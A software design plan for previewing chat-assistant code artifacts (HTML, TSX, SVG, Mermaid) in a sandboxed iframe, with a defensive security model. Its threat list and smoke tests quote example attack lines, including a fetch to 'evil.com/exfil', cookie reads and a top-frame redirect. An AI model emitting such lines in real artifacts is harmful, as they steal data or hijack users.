# Plan: Live artifact rendering (sandboxed iframe)

Status: **planning** — no code yet.

When the assistant emits a code artifact that looks renderable (HTML
document, TSX/JSX, SVG, Mermaid), preview it as actual rendered UI
instead of (or alongside) syntax-highlighted text. Renders inside a
sandboxed iframe; small artifacts get an inline thumbnail in the chat
bubble; larger or escalated ones open in the same right-side `Sheet`
the PDF viewer uses.

Builds on the existing artifact model (`Artifact` with `kind: 'code'`
+ `language` per `lib/shared/types.ts:522`), the auto-archive of
fenced code blocks at stream end (`lib/shared/code-blocks.ts`), and
the PDF viewer's panel pattern (`components/pdf-viewer/`).

## Why

The chat today treats every code block as text. A user asking "show
me a hover-glow button" sees the TSX but has to copy-paste it into a
sandbox to see the result. Live rendering closes the loop: prompt →
result you can actually see and click. It's also the bar set by
Claude.ai's "artifacts" feature, which trained users to expect this
behaviour from any serious chat assistant.

We have a strong tailwind here: frontier models already emit
**self-contained HTML pages** (React + Tailwind via CDN, vanilla
HTML, SVG) as their default artifact shape, because they were
trained on years of that exact pattern. The renderer should match
those defaults rather than fight them.

## Goal & scope cuts

**v1 ships:**

- **Renderable kinds:**
  - **HTML** documents (`language: 'html'` artifacts, or fenced ```` ```html ``` ```` blocks). Self-contained: the model's own `<style>` and `<script>` tags work.
  - **TSX / JSX** artifacts. Wrapped at runtime in a minimal HTML shell with React + ReactDOM + Tailwind via CDN (Babel standalone for JSX transpile in-iframe).
  - **SVG** standalone — rendered directly.
  - **Mermaid** diagram source — rendered via Mermaid CDN injected into the shell.
- **Sandbox model:** every preview runs in `<iframe sandbox="allow-scripts">` with `srcdoc` set. Crucially, **no `allow-same-origin`** — the iframe gets a `null` origin, so it can't read the parent's localStorage, cookies, or make same-origin fetches to our API routes.
- **Inline preview by default for small artifacts.** Height-capped (~200 px), width matches the chat bubble. Click to escalate to the side panel. Heuristic for "small": artifact `content.length < 1500` AND no fixed-width layout cues (no `min-width:` properties, no `viewport` meta with extreme width).
- **Side panel for everything else.** Same right-side `Sheet` the PDF viewer uses (`components/pdf-viewer/pdf-viewer.tsx:153`). Toolbar with: artifact title, Render / Code toggle, Open in new tab (escapes the iframe for the user, useful for debugging), Copy code, dismiss.
- **Share-the-slot with PDF viewer.** Opening the artifact panel closes any open PDF; opening a PDF closes any open artifact. One viewer slot at a time. Coordinated via a tiny new module that knows about both Zustand stores.
- **Render / Code toggle in the panel.** Defaults to Render; flip to Code shows the existing `CodeHighlight` view. Inline preview is render-only — code is already visible above it in the chat.
- **Refresh affordance** in the panel toolbar. Reloads the iframe — useful when the artifact uses time-based randomness or a flaky CDN.

**Cut from v1 to keep it shippable:**

- **Editing the artifact in place** and live-reloading the iframe. That's an IDE feature; out of scope.
- **Multi-file artifacts.** Sandpack territory — different product. Single-file only.
- **Persisting renders.** The iframe re-runs each open. We don't snapshot the rendered DOM.
- **Network access inside the iframe.** The sandbox is `allow-scripts` only — no `allow-same-origin`, no `allow-forms`, no `allow-popups`. CDN script tags work (they're cross-origin to the null-origin iframe, just like to any normal page); same-origin fetches to our app's API routes don't (and shouldn't).
- **Custom user CSS / theme injection.** Tailwind via CDN gives reasonable defaults; users can't pre-supply their own design system in v1.
- **Renders for `kind: 'image'` artifacts.** Those already render as `<img>` — nothing to do.
- **Renders for `kind: 'markdown'`, `'json'`, `'table'`.** Already have appropriate renderers (`MarkdownPreview`, `JsonHighlight`, table grid). No live-render value-add.
- **Auto-render languages we can't sandbox safely** — `python`, `bash`, `sql`, etc. They stay as syntax-highlighted code, no preview affordance.
- **Mobile inline preview.** Iframe-in-chat-bubble at mobile widths is awkward; mobile gets the escalate-to-panel button directly. (The panel slides up as a bottom sheet on mobile via the same `Sheet` primitive.)

## Surface architecture

### The iframe shell

**`lib/client/live-artifact/iframe-shell.ts`** *(new, pure)*. Given an
artifact (kind + language + content), produces the full HTML document
string that goes into the iframe's `srcdoc`. Has four templates:

- **HTML passthrough** — content is the whole document or an HTML
  snippet. Snippets get wrapped in a minimal `<!doctype html>`
  shell with Tailwind via CDN. Full documents pass through.
- **TSX/JSX shell** — wraps content in:
  ```html
  <!doctype html><html><head>
    <script src="https://cdn.tailwindcss.com"></script>
    <script crossorigin src="https://unpkg.com/react@19/umd/react.development.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@19/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
  </head><body>
    <div id="root"></div>
    <script type="text/babel">
      {{user TSX, plus a trailing `ReactDOM.createRoot(document.getElementById('root')).render(<App/>)`}}
    </script>
  </body></html>
  ```
  Heuristic for finding the component to mount: prefer `App`, then
  `Demo`, then the last `export default` identifier, then the first
  function/const that returns JSX. If we can't find one, show an
  inline error in the iframe.
- **SVG passthrough** — wrap raw SVG in a centered `<body>`.
- **Mermaid** — wraps mermaid source in a `<div class="mermaid">`
  plus the Mermaid CDN bootstrap call.

All four are pure string templates — testable in isolation. **CDN
URLs are pinned to specific versions** in a constants module, not
free-floating; so version drift is a one-file PR, not a silent
breaking change.

### Detector

**`lib/client/live-artifact/detect.ts`** *(new, pure)*. Given an
artifact, returns `{ renderable: boolean; shell: 'html' | 'tsx' | 'svg' | 'mermaid' | null }`.

Rules:
- `kind === 'image'` → not renderable here (already a real image).
- `kind === 'code'` and `language` in `['html', 'tsx', 'jsx', 'svg', 'mermaid']` → renderable, shell follows the language.
- `kind === 'code'` and `content.trim().startsWith('<!doctype')` (case-insensitive) → renderable as HTML even if language is missing.
- `kind === 'code'` and `content.trim().startsWith('<svg')` → renderable as SVG.
- Anything else → not renderable.

### Iframe component

**`components/live-artifact/live-artifact-frame.tsx`** *(new)*. Takes
an artifact, runs it through the detector + shell, and renders an
`<iframe sandbox="allow-scripts" srcdoc={shell}>`. Listens for an
`onLoad` to clear a brief loading state. Listens for iframe-emitted
`postMessage` of `{ type: 'error', message }` so in-iframe script
errors can surface in our toolbar without breaking the parent. (The
shell's `<script>` tags include a tiny `window.onerror` hook that
posts the message back up. The parent only acts on messages from the
specific iframe ref.)

### Inline preview

**`components/live-artifact/inline-preview.tsx`** *(new)*. Used by
the chat-message renderer (`components/panels/chat-message.tsx`)
when it detects a renderable code block. Renders the iframe at
height ~200 px with `pointer-events: auto` inside (so the preview is
interactive). Click outside the iframe area — on the surrounding
chrome — escalates to the side panel.

Hooks into the existing per-message code-block flow:
`extractCodeBlocks(message.content)` (per `chat-message.tsx:179`)
already gives us the blocks. We add a "is this renderable" check via
the detector and conditionally render `<InlinePreview>` next to (or
in place of) the `CodeHighlight`.

### Side panel

**`components/live-artifact/live-artifact-panel.tsx`** *(new)*. The
right-side `Sheet`, modelled on `components/pdf-viewer/pdf-viewer.tsx`.
- `<Sheet open onOpenChange>` with `side="right"`.
- Default width: `w-[55vw]` (vs PDF's smaller default — landing-page
  mockups need real estate). Min `w-[400px]`, max `w-[80vw]`.
- Resizable left edge (drag-to-resize). Width persisted per-user in
  the existing Zustand store.
- Toolbar: title, Render / Code toggle, Refresh, Open in new tab,
  close.
- Body: either `<LiveArtifactFrame>` (Render mode) or `<CodeHighlight>`
  (Code mode).
- Mobile: same `Sheet` primitive collapses to a full-screen overlay
  (existing pattern).

### Opener store + slot coordination

**`components/live-artifact/store.ts`** *(new, mirrors `pdf-viewer/types.ts`)*:

```ts
interface LiveArtifactStore {
  target: { artifactId: string } | null
  open: (artifactId: string) => void
  close: () => void
}
export const useLiveArtifact = create<LiveArtifactStore>(...)
```

**`components/right-panel-slot.ts`** *(new, tiny)*. Encodes the
share-the-slot rule:

```ts
export function openArtifact(id: string) {
  usePdfViewer.getState().close()
  useLiveArtifact.getState().open(id)
}
export function openPdf(target: PdfViewerTarget) {
  useLiveArtifact.getState().close()
  usePdfViewer.getState().open(target)
}
```

All existing PDF callers route through `openPdf` instead of the raw
store action. Same for artifact callers. Trivial to grep + rename.

Alternative considered: a single `useRightPanel` store with a
discriminated `target` union. Cleaner but requires touching every
PDF call site to migrate state into a new store. The thin shim above
gives the same UX with zero migration risk.

### Hooking up the chat surface

Three small additions in `components/panels/chat-message.tsx`:

1. In the per-code-block render loop (the one that uses
   `extractCodeBlocks`), pass each block through the detector. If
   renderable AND small, render an `<InlinePreview>` below the
   `CodeHighlight`. If renderable AND large, render a single "Open
   preview" button.
2. The existing "Save as artifact" button gets a sibling **"Preview"**
   button on renderable blocks.
3. Wire button clicks into `openArtifact()` from the slot
   coordinator.

For artifacts opened from the artifacts panel (`components/panels/artifacts-tab.tsx:271`), add a "Preview" button next to the existing "Edit" / "Copy" actions on `kind: 'code'` artifacts with renderable languages.

## Sandbox security model

The iframe gets `sandbox="allow-scripts"` and nothing else. Concretely:

| Capability | Allowed | Why / why not |
|---|---|---|
| `allow-scripts` | ✅ | Whole point — we want React + Tailwind + the user's component to actually run. |
| `allow-same-origin` | ❌ | Without this, `srcdoc` iframes get a **null/opaque origin**. They can't read our `document.cookie`, `localStorage`, or make same-origin fetches against our API routes. |
| `allow-forms` | ❌ | Generated demos shouldn't post forms anywhere; if a future need arises, revisit. |
| `allow-popups` | ❌ | No `window.open` to surprise the user. |
| `allow-modals` | ❌ | No `alert/confirm/prompt` blocking the page. |
| `allow-top-navigation` | ❌ | The iframe can't navigate the parent. Critical. |

Three additional defenses:

- **CSP on the iframe document.** The shell includes a strict
  `<meta http-equiv="Content-Security-Policy">` allowing CDN script
  hosts only (`cdn.tailwindcss.com`, `unpkg.com`, plus a small
  allowlist for Mermaid). No `connect-src` for arbitrary endpoints
  — so even if the model generates a `fetch('https://evil.com/exfil')`
  call, it's blocked at the iframe level.
- **`window.onerror` capture** posts the error message up to the
  parent. Parent surfaces it in the panel toolbar. This makes
  failures visible instead of silent.
- **No `referrerpolicy` leak.** Set `referrerpolicy="no-referrer"` on
  the iframe element so the iframe's outbound requests (which only
  hit the CDN allowlist) don't leak the user's URL.

What this protects against:

- Model generates `<script>fetch('/api/admin/users')</script>` — blocked, the iframe can't talk to our origin.
- Model generates `<script>document.cookie</script>` — sees an empty cookie jar (null origin).
- Model generates `<script>top.location = 'evil.com'</script>` — blocked, `allow-top-navigation` not granted.
- Model generates a popup ad — blocked, `allow-popups` not granted.

What this **does not** protect against:

- Model generates a really expensive infinite loop. Crashes the iframe tab but not the parent process. Mitigation: a "Stop" button on the panel that detaches the iframe. (Inline preview iframes get a 5-second `setTimeout` cap on initial execution — past that, we kill the iframe and show "render timed out.")
- Model generates content that's offensive / NSFW / phishing-themed. Out of scope for sandboxing — that's a model-policy / safety problem.

## Data model changes

**None required.** Live rendering operates on existing `Artifact`
rows. Nothing persisted about renders.

One optional add (defer to a Phase 2): a `previewable: boolean`
column on `Artifact` so the server can pre-compute the
renderable-ness check at stream-archive time. Not needed for v1 —
the client-side detector is cheap.

## Files touched

| File | Why |
|---|---|
| `lib/client/live-artifact/iframe-shell.ts` *(new)* | 4 shell templates (HTML / TSX / SVG / Mermaid) |
| `lib/client/live-artifact/iframe-shell.test.ts` *(new)* | Snapshot + property tests on the shells |
| `lib/client/live-artifact/detect.ts` *(new)* | Renderable-ness rules |
| `lib/client/live-artifact/detect.test.ts` *(new)* | Exhaustive rule tests |
| `lib/client/live-artifact/cdn-urls.ts` *(new)* | Pinned CDN versions (React, Tailwind, Babel, Mermaid) |
| `components/live-artifact/live-artifact-frame.tsx` *(new)* | Bare iframe + postMessage error capture |
| `components/live-artifact/inline-preview.tsx` *(new)* | In-bubble small preview |
| `components/live-artifact/live-artifact-panel.tsx` *(new)* | Right-side `Sheet`, modelled on `pdf-viewer/pdf-viewer.tsx` |
| `components/live-artifact/store.ts` *(new)* | `useLiveArtifact` Zustand opener |
| `components/right-panel-slot.ts` *(new)* | Share-the-slot coordinator with PDF viewer |
| `components/panels/chat-message.tsx` | Per-code-block detector + inline preview render + Preview button |
| `components/panels/artifacts-tab.tsx` | Preview button on `kind: 'code'` artifacts |
| `components/markdown-preview.tsx` | Migrate PDF opener calls to `openPdf()` from slot coordinator (one-line touch) |

**~800 lines** of new code + ~150 of tests. Bigger than the slash
commands (~250) but smaller than a full IDE. Half of the volume is
the four iframe-shell templates + their tests; the rest is the
panel + inline-preview + detector plumbing.

## Test plan

- **`detect.test.ts`** *(~20 cases):*
  - Every `language` value in the rule table, hit + miss
  - `<!doctype html>` detection (case sensitivity, leading whitespace)
  - `<svg>` detection
  - Mixed-content artifacts (code with embedded HTML doc)
  - Empty content, whitespace-only content
- **`iframe-shell.test.ts`** *(~15 cases):*
  - Each shell produces valid HTML (no unclosed tags, doctype present)
  - TSX shell finds the right mount component (App / Demo / last default export / first JSX-returning fn)
  - HTML passthrough vs HTML snippet detection
  - Mermaid bootstrap injection
  - CSP meta-tag present in every shell
  - User script tags don't escape the wrapper (escape via injection of `</script>`)
- **Manual UX**:
  - Ask the model for "a hover-glow button in TSX" — see inline preview render, interact with it, escalate to panel.
  - Ask for "a landing page hero with Tailwind" — see panel-only preview (because content > 1500 chars).
  - Open a PDF then open an artifact — PDF closes. Open an artifact then a PDF — artifact closes.
  - Refresh button reloads the iframe.
  - Render error (intentionally broken JSX) surfaces in the toolbar.
- **Security smoke tests** (manual):
  - Render an artifact with `<script>fetch('/api/whoami')</script>` — verify the request is blocked / blocked-by-CSP-not-allowed.
  - Render an artifact with `<script>document.cookie='foo=bar'; alert(document.cookie)</script>` — verify cookie isn't set on parent and alert is blocked (no `allow-modals`).
  - Render an artifact with `<script>top.location='https://example.com'</script>` — verify parent doesn't navigate.

## Effort

~10–14 days of focused work end to end. Bulk is the iframe-shell
templates (and getting the TSX mount detection robust) + the panel
UX polish (resizable, mobile bottom sheet).

## Risk

**Medium.** Three risks worth flagging:

1. **TSX mount detection is the fiddly part.** Models produce
   wildly varied component shapes — anonymous default exports,
   named functions, arrow functions, `export function App`, no
   export at all. Mitigation: ship a generous fallback ("if all
   else fails, mount the last function declaration we see") plus a
   prominent in-iframe error message when nothing mountable is
   found, so the user can prompt the model to fix it. Don't try to
   make this 100% — make the failure mode clear.

2. **CDN dependency.** Tailwind / React / Babel via CDN means
   each preview is a cold-cache CDN request. Mitigation: pinned
   versions + browser HTTP cache + the inline-preview height cap
   (so a slow render doesn't block layout). Worst case for an
   offline user: the preview shows "couldn't load resources" but
   the chat keeps working.

3. **Sandbox correctness is unforgiving.** A single `allow-same-origin`
   added "for testing" and not removed is a real security regression.
   Mitigation: a unit test that snapshot-asserts the iframe
   element's `sandbox` attribute value at the component level, so
   future PRs trip the test if the value changes.

## Open questions

- **Auto-preview vs click-to-preview for inline.** v1 has small
  artifacts auto-render inline. Some users may find inline iframes
  in chat noisy (especially for long conversations). A user
  preference toggle "Always require click to preview" in Settings
  would be nice but adds setup; not v1.
- **What's the "small artifact" threshold?** `content.length < 1500`
  is a guess. Might want to also gate on rendered iframe height
  (measure with a hidden first-render → swap to visible if under N
  pixels). Adds complexity. Recommend ship the char-count rule and
  tune from there.
- **Should the panel remember the last opened artifact across page
  reloads?** PDF viewer doesn't. Probably no for consistency, but
  if users start opening the same artifact from multiple chats
  it'd be a small win.
- **Mermaid version pin** — Mermaid evolves quickly and ships
  breaking changes. Pick a known-good v10.x and document the
  upgrade path.
- **Allow user-supplied dependencies via `<script src="...">` in
  HTML artifacts?** Today the CSP allows only our pinned CDN hosts.
  Users may want to demo a Three.js scene that pulls from another
  CDN. v1 says no; revisit with a per-artifact allow-extra-CDN
  field once we see how often it bites.
